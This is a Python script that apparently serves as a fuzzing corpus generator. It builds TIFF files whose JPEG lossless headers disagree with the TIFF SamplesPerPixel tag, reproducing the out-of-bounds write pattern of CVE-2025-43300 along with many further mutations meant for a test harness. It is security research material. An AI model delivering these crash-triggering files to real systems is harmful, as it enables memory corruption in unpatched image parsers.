#!/usr/bin/env python3
"""
jpeg_lossless_gen.py — Generate TIFF files with embedded JPEG Lossless streams
targeting the CVE-2025-43300 metadata disagreement pattern.

CVE-2025-43300 root cause (from Quarkslab analysis):
  - TIFF tag SamplesPerPixel = 2
  - JPEG SOF3 marker NumComponents = 1
  - Decompressor uses SamplesPerPixel for loop bound but gets
    NumComponents bytes per iteration → writes 2× expected → OOB

This generator creates valid-looking JPEG lossless streams with
controlled disagreements between the TIFF container and the JPEG headers.
"""

import struct
import os
import sys

# ── JPEG markers ────────────────────────────────────────────────────

SOI  = b'\xFF\xD8'              # Start of Image
SOF3 = b'\xFF\xC3'              # Start of Frame — Lossless (Huffman)
DHT  = b'\xFF\xC4'              # Define Huffman Table
SOS  = b'\xFF\xDA'              # Start of Scan
EOI  = b'\xFF\xD9'              # End of Image


def make_sof3(width, height, num_components, bits_per_sample=8):
    """
    Build a JPEG SOF3 (lossless) marker segment.

    Layout:
      FF C3           marker
      Lf (2 bytes)    length of segment (excluding marker)
      P  (1 byte)     sample precision (bits)
      Y  (2 bytes)    height
      X  (2 bytes)    width
      Nf (1 byte)     number of components
      For each component:
        Ci (1 byte)   component ID
        Hi:Vi (1 byte) sampling factors (4 bits each)
        Tqi (1 byte)  quantisation table selector
    """
    # Length = 8 + 3 * num_components
    length = 8 + 3 * num_components
    data = struct.pack('>HBHHb', length, bits_per_sample, height, width, num_components)
    for i in range(num_components):
        data += struct.pack('BBB', i + 1, 0x11, 0)  # Ci, Hi:Vi=1:1, Tq=0
    return SOF3 + data


def make_dht_minimal():
    """Build a minimal Huffman table (DC table, class 0, id 0)."""
    # Minimal DHT: 1 code of length 1 = value 0
    # bits[1..16]: 1,0,0,...,0  (one code of length 1)
    # values: 0
    bits = bytes([1] + [0] * 15)
    values = bytes([0])
    length = 2 + 1 + 16 + len(values)  # Lh + Tc:Th + bits + values
    data = struct.pack('>HB', length, 0x00)  # class=0 (DC), id=0
    data += bits + values
    return DHT + data


def make_sos(num_components):
    """Build a Start of Scan marker for lossless JPEG."""
    # Length = 6 + 2 * num_components
    length = 6 + 2 * num_components
    data = struct.pack('>HB', length, num_components)
    for i in range(num_components):
        data += struct.pack('BB', i + 1, 0x00)  # Cs, Td:Ta = 0:0
    # Ss=1 (predictor selection), Se=0, Ah:Al=0:0
    data += struct.pack('BBB', 1, 0, 0)
    return SOS + data


def make_jpeg_lossless(width, height, sof_components, scan_components=None,
                        bits_per_sample=8, pixel_data=None):
    """
    Build a complete JPEG lossless bitstream.

    Parameters:
        width, height: image dimensions
        sof_components: number of components declared in SOF3
        scan_components: number of components in SOS (defaults to sof_components)
        bits_per_sample: precision
        pixel_data: raw scan data (if None, generates minimal valid data)
    """
    if scan_components is None:
        scan_components = sof_components

    stream = SOI
    stream += make_sof3(width, height, sof_components, bits_per_sample)
    stream += make_dht_minimal()
    stream += make_sos(scan_components)

    # Scan data — minimal: just enough bytes for the decoder to not immediately fail
    if pixel_data is None:
        # For lossless JPEG: each pixel is encoded as a difference
        # Minimal: width * height * num_components bytes (rough approximation)
        n_bytes = max(16, width * height * sof_components)
        pixel_data = bytes([0x80] * min(n_bytes, 4096))

    stream += pixel_data
    stream += EOI

    return stream


# ── TIFF container builder ──────────────────────────────────────────

def make_tiff_with_jpeg_lossless(
    width, height,
    tiff_spp,              # SamplesPerPixel in TIFF tags
    jpeg_sof_components,   # NumComponents in JPEG SOF3
    jpeg_scan_components=None,
    bits_per_sample=8,
    compression=7,         # 7=JPEG, 34892=JPEG Lossless (DNG)
):
    """
    Build a TIFF file with embedded JPEG lossless stream.

    The key disagreement: tiff_spp vs jpeg_sof_components.
    When these differ, the decompressor may use the wrong value
    for buffer size calculations.
    """
    jpeg_data = make_jpeg_lossless(
        width, height, jpeg_sof_components,
        scan_components=jpeg_scan_components,
        bits_per_sample=bits_per_sample,
    )

    # TIFF IFD entries
    bo = '<'  # little-endian
    entries = []

    def add_entry(tag, dtype, count, value):
        entries.append(struct.pack(bo + 'HHII', tag, dtype, count, value))

    add_entry(256, 3, 1, width)           # ImageWidth
    add_entry(257, 3, 1, height)          # ImageLength
    add_entry(258, 3, 1, bits_per_sample) # BitsPerSample
    add_entry(259, 3, 1, compression)     # Compression
    add_entry(262, 3, 1, 1)              # PhotometricInterpretation (BlackIsZero)
    # StripOffsets — will be calculated
    strip_offset_entry_idx = len(entries)
    add_entry(273, 4, 1, 0)              # placeholder
    add_entry(277, 3, 1, tiff_spp)       # SamplesPerPixel — THE KEY TAG
    add_entry(278, 3, 1, height)         # RowsPerStrip
    add_entry(279, 4, 1, len(jpeg_data)) # StripByteCounts

    n_entries = len(entries)
    header = b'II' + struct.pack('<HI', 42, 8)  # TIFF header, IFD at offset 8

    ifd = struct.pack('<H', n_entries)
    for e in entries:
        ifd += e
    ifd += struct.pack('<I', 0)  # next IFD = none

    # Calculate strip offset (JPEG data starts after header + IFD)
    strip_offset = len(header) + len(ifd)

    # Fix the StripOffsets value
    ifd_bytes = bytearray(ifd)
    entry_offset = 2 + strip_offset_entry_idx * 12 + 8  # offset to value field
    struct.pack_into('<I', ifd_bytes, entry_offset, strip_offset)

    return header + bytes(ifd_bytes) + jpeg_data


# ── Mutation generators ─────────────────────────────────────────────

def generate_mutations():
    """Generate all TIFF+JPEG lossless mutation variants."""
    mutations = []

    # Core CVE-2025-43300 pattern: SPP=2, SOF3 components=1
    mutations.append((
        make_tiff_with_jpeg_lossless(8, 8, tiff_spp=2, jpeg_sof_components=1),
        "spp2_sof1_exact_cve_pattern"
    ))

    # Reversed: SPP=1, SOF3 components=2
    mutations.append((
        make_tiff_with_jpeg_lossless(8, 8, tiff_spp=1, jpeg_sof_components=2),
        "spp1_sof2_reversed"
    ))

    # Extreme disagreement: SPP=4, SOF3 components=1
    mutations.append((
        make_tiff_with_jpeg_lossless(8, 8, tiff_spp=4, jpeg_sof_components=1),
        "spp4_sof1"
    ))

    # SPP=255, SOF3=1
    mutations.append((
        make_tiff_with_jpeg_lossless(8, 8, tiff_spp=255, jpeg_sof_components=1),
        "spp255_sof1"
    ))

    # SPP=2, SOF3=3 (both disagree, both > 1)
    mutations.append((
        make_tiff_with_jpeg_lossless(8, 8, tiff_spp=2, jpeg_sof_components=3),
        "spp2_sof3"
    ))

    # Matching values (control — should be safe)
    mutations.append((
        make_tiff_with_jpeg_lossless(8, 8, tiff_spp=1, jpeg_sof_components=1),
        "spp1_sof1_control"
    ))

    # Matching but high (3 components — RGB)
    mutations.append((
        make_tiff_with_jpeg_lossless(8, 8, tiff_spp=3, jpeg_sof_components=3),
        "spp3_sof3_control"
    ))

    # SOF3 says 0 components (invalid)
    mutations.append((
        make_tiff_with_jpeg_lossless(8, 8, tiff_spp=2, jpeg_sof_components=0),
        "spp2_sof0"
    ))

    # SOS disagrees with SOF3
    mutations.append((
        make_tiff_with_jpeg_lossless(8, 8, tiff_spp=2, jpeg_sof_components=2,
                                      jpeg_scan_components=1),
        "spp2_sof2_sos1"
    ))

    mutations.append((
        make_tiff_with_jpeg_lossless(8, 8, tiff_spp=1, jpeg_sof_components=1,
                                      jpeg_scan_components=3),
        "spp1_sof1_sos3"
    ))

    # Compression type variations
    for comp in [7, 34892, 34712, 8]:  # JPEG, DNG-JPEG, JPEG2000, Deflate
        mutations.append((
            make_tiff_with_jpeg_lossless(8, 8, tiff_spp=2, jpeg_sof_components=1,
                                          compression=comp),
            f"spp2_sof1_comp{comp}"
        ))

    # Bits per sample variations with disagreement
    for bps in [1, 4, 12, 16, 32]:
        mutations.append((
            make_tiff_with_jpeg_lossless(8, 8, tiff_spp=2, jpeg_sof_components=1,
                                          bits_per_sample=bps),
            f"spp2_sof1_bps{bps}"
        ))

    # Dimension variations with disagreement
    for w, h in [(1, 1), (1, 65535), (65535, 1), (256, 256), (4096, 4096)]:
        mutations.append((
            make_tiff_with_jpeg_lossless(w, h, tiff_spp=2, jpeg_sof_components=1),
            f"spp2_sof1_{w}x{h}"
        ))

    # Large SPP values (integer overflow in SPP * width calculation)
    for spp in [128, 255, 256, 32767, 65535]:
        mutations.append((
            make_tiff_with_jpeg_lossless(8, 8, tiff_spp=spp, jpeg_sof_components=1),
            f"spp{spp}_sof1"
        ))

    return mutations


if __name__ == '__main__':
    mutations = generate_mutations()
    print(f"Generated {len(mutations)} JPEG lossless mutations")

    out_dir = '/tmp/jpeg_lossless_corpus'
    os.makedirs(out_dir, exist_ok=True)

    for data, name in mutations:
        path = os.path.join(out_dir, f'{name}.tiff')
        with open(path, 'wb') as f:
            f.write(data)

    print(f"Written to {out_dir}/")
    print(f"Run: for f in {out_dir}/*.tiff; do ./imageio_harness \"$f\" || echo \"FAIL: $f\"; done")
